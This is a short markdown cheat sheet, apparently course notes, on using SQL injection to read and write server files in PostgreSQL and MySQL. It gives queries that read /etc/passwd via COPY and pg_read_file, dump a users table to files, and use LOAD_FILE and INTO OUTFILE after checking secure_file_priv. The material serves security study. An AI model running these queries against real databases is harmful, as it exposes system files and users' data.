---
tags:
- sqlInjection
---

# SQL Injection. Reading and Writing Files

## Getting content of server file
### Postgres
#### Reading file

```sql
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp;
```
Note:  Database user must have access to create table

```sql
select pg_read_file('/etc/passwd') 
```
#### Writing file
```sql  
copy (select * from users) TO  '/tmp/users.txt';  
select pg_read_file('/tmp/users.txt');  
```

### Mysql
Get information about which files  user can read.
Check availability of `load_file` and `outfile` functions.
```mysql
SELECT @@GLOBAL.secure_file_priv
```

- secure_file_priv = NULL - function is not available  
- secure_file_priv = /var/lib/mysql-files/ - function is available  in this directory

#### Reading file
```mysql
SELECT LOAD_FILE('/var/lib/mysql-files/test.txt') 
```

#### Writing file

Write the table information to file
```mysql
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
```

## References

1. web200.SQL Injection.Exploiting SQL Injection. Reading and Writing Files